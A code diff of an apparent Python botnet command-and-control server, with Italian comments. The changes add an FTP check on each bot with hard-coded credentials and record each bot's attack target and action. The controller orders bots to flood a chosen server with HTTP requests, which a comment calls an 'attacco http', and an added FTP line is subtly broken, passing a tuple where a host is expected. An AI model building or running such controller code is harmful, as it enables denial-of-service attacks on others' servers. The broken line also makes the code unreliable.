@@ -3,6 +3,7 @@ import socket
 import json
 from asyncio import Event
 from concurrent.futures import ThreadPoolExecutor
+from ftplib import FTP
 from time import sleep
 
 import requests
@@ -10,7 +11,7 @@ import requests
 
 class CC:
     # lista dei bot attivi con le relative porte
-    activeBotSf = True
+    activeBotSM = True
     activeBot = {}
 
     # costruttore
@@ -19,11 +20,11 @@ class CC:
 
     # aggiunge un bot alle liste
     def addBot(self, ip, data):
-        while (not self.activeBotSf):
+        while (not self.activeBotSM):
             continue
-        self.activeBotSf = False
+        self.activeBotSM = False
         self.activeBot[ip] = json.loads(data)
-        self.activeBotSf = True
+        self.activeBotSM = True
         return True
 
     # imposta lo stato di attività del bot
@@ -57,24 +58,23 @@ class CC:
             conn.close()
             s.close()
 
-    def checkBot(self, target=""):
+    def checkBot(self):
         print("Controllo bot attivi...")
-        if target == "":
-            rm = []
-            for k, v in self.activeBot.items():
-                try:
-                    url = "http://" + k + ":" + str(v['http']) + "/status"
-                    response = requests.get(url)
-                    res = response.json()
-                except Exception as e:
-                    print(k, " is not reachable over http port: ", e)
-        else:
+        rm = []
+        for k, v in self.activeBot.items():
             try:
-                url = "http://" + target + ":" + str(self.activeBot[target]['http']) + "/status"
+                url = "http://" + k + ":" + str(v['http']) + "/status"
                 response = requests.get(url)
                 res = response.json()
             except Exception as e:
-                print(target, " is not reachable over http port: ", e)
+                print(k, " is not reachable over http port: ", e)
+            try:
+                url = k,":",str(v['ftp'])
+                ftp = FTP(url, "CC", "Sicurezza")
+                print(ftp.getwelcome())
+            except Exception as e:
+                print(k, " is not reachable over ftp port: ", e)
+
         print("Controllo terminato")
 
     def makeHTTPRequest(self, server, time=1, target=""):
@@ -85,7 +85,8 @@ class CC:
                     url = "http://" + k + ":" + str(v["http"]) + "/doGet"
                     response = requests.post(url, json={"url": server, "time":time})
                     res = response.json()
-                    self.activeBot[k]["status"] = res["status"]
+                    self.activeBot[k]["target"] = res["target"]
+                    self.activeBot[k]["action"] = res["action"]
                 except Exception as e:
                     print(e)
         else:
@@ -93,7 +94,8 @@ class CC:
                 url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/doGet"
                 response = requests.post(url, json={"url": server, "time": time})
                 res = response.json()
-                self.activeBot[target]["status"] = res["status"]
+                self.activeBot[target]["target"] = res["target"]
+                self.activeBot[target]["action"] = res["action"]
             except Exception as e:
                 print(e)
         print("Richiesta inviata")
@@ -143,9 +145,9 @@ class CC:
                     print(f"{k}\t{v['http']}\t\t{v['ftp']}")
             #Mostra la lista di tutti i bot attivi ed il relativo stato
             elif comando == "ls -s":
-                print("Ip\t\thttp\t\tftp\t\tstatus")
+                print("Ip\t\thttp\t\tftp\t\ttarget\t\t\t\taction")
                 for k, v in self.activeBot.items():
-                    print(f"{k}\t{v['http']}\t\t{v['ftp']}\t\t{v['status']}")
+                    print(f"{k}\t{v['http']}\t\t{v['ftp']}\t\t{v['target']}\t\t{v['action']}")
             #Comando per eseguire un'attacco http ad un determinato server
             elif comando.startswith("get"):
                 c = comando.split(" ")
